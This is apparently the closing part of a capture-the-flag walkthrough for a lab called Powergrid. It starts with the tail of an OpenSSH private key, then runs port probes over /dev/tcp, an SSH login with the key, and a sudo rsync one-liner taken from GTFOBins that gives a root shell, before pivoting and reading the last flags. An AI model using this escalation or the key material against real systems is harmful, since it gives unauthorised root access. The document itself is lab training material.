AKlC/VdcjQdstXiFEinEU4ALIyZg6Pkim/Et3v3gMGEkG4hN0mwiIVI5jvLtKtd+5opLKM
KspBSwz1m8JxX48WERiJf9pmf8WuYTql3D4vbhJ14gLoEP0TwycQe089xxGM9QMafBIvQG
OSfyo81JmqoXpRy+wyhkTKoNivBxENOATDy3bG0z5bfRQAlz7o5sjLh3wEMNq+gbQsmQBB
mDgD4wA4c0/aTl7/UQXdnkcI+/+fOwfP0UOFZcWjO6ZORJloKjdA2nvVbvox+6ZyRrP3AS
FWt7DYOrBbi3cJhjyJSq38qQpG1Yy0DbhMKJGMQJbjCKf3bw+cDSsu5WiKK7y+3LFns0Jd
NNflVRMkCERdAxWRE7Ga/1r6/TweLRCQkyGGq93sETeP373I4v35BVe6rMHTZ3U2rZ8cr/
71suv4FGP4LmvEqd/S00mgXngHLK8/KtjVKqIZAD8+ft7mTXE9hyNPV/QLdbm/IJ5C5Fdf
BEdelzvB0Jp73ylHdhAAABACBdUjdZpPwEYyUnKRp3Xs5dEqt3IHuUV37BtAREjWT5X3bN
afjtFDJ4A+ThPG6WImjP2IFaXWrZ0fgiSi8i8BWe3Hq6oZaApVPB7S7fxhcUm6z7TRwrUp
HOZrbeZ7wN6CTD5VjvL4B8Q9C8AyoNg/AtJKhxYjmPN+hoaShcKCjuezwKo0E3C/Q9Mf/X
9ARR0Tfklaa2LapipPK2e3td/I84YJd7GyWxCDAmGw5RSu2cFfcwevd56CzMreJBSv7Kp8
2eX+WC+6fAomSD3h/BBL71mS14hWx5N+vTxLzjqg94VfSYEE5qGvTxZRFKf/bv05sGtv/R
sK58Zhl2QfA60QAAAAEBANxmyymkC/t43RF1Pgv7lgzj7jyKMoXWcATvG3Rn026LAINMNR
AIsggMIbDi2k7K0N4jZxUmvgHFS/IVkoAMOoqbopH3R/S/oDY6gBbqkZdxHYrzAFFAI7YU
mUndb4CXRIEwjf5kRMBVIL+Ws/aWlMvuegSmB06eBsaP7lIwPZSRYcC6pr3yg5YV2I3p7k
WWmuMlC9kvOBIl99ue8k9rGuQW6JBXZuJglHHSZk5t2cR3jxmz9KitZ96wMludkGXKHAOr
FkX8DSpYQlPOSEMRBizOf5LU6UEZTD8sDYT9DzqhRM98TaiQc1m/YD2r/Lg6A7QeyEnyJX
DqZ/48FybkHasAAAEBAMyDvNem68DH64iQbK6oGITTdHJxHtp/qKnIKGOfEdrjBsYJWXj3
rL3F6VHrWxNmj6mVNKs2SQpLptIKclmW8+UlBYYtf4LgTzRRWMv3Ke9HYoXSpNkIIKYG2+
TWeH1nMQDeqph1f3vMzNA6SScMpipuV5ofaENArOh6kCTFXVVuGHjoZgbgCg73FXBaTYid
Ne1y8L/lwpsPLWevpsm5DLwUrqcDaDMMd6CFjSjcKrj99DGy7oKwvkz+4wxbsumvSmUTiY
XZVmZsuWDJbJkLzjKs6kJg14zcXm+fDPeuSVLIQ1zd4C39QzD6CGKyXVn2zlFCs46g1Z6j
31r4Qk2RNRkAAAANcDQ4QHBvd2VyZ3JpZAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

cd /tmp
nano id_rsa # put open ssh file
chmod 600 id_rsa

ping -c 1 172.17.0.2
ssh -nltp

<>

echo '' > /dev/tcp/172.17.0.2/22
echo $? # 0 = open port

echo '' > /dev/tcp/172.17.0.2/23
echo $? # 1 = closed port

ssh -i id_rsa p48@172.17.0.2

sudo -l
# ans
Matching Defaults entries for p48 on ef117d7a978f:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User p48 may run the following commands on ef117d7a978f:
    (root) NOPASSWD: /usr/bin/rsync

# GTFOBIns
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

root@ef117d7a978f:~# cat flag3.txt 
009a4ddf6cbdd781c3513da0f77aa6a2

Well done for getting the third flag. Are you any good at pivoting backwards?

ssh root@172.17.0.1

root@powergrid:~# cat flag4.txt 
f5afaf46ede1dd5de76eac1876c60130

Congratulations. This is the fourth and final flag. Make sure to delete /var/www/html/startTime.txt to stop the attack (you will need to run chattr -i /var/www/html/startTime.txt first).

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by Thomas Williams - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear your comments.


```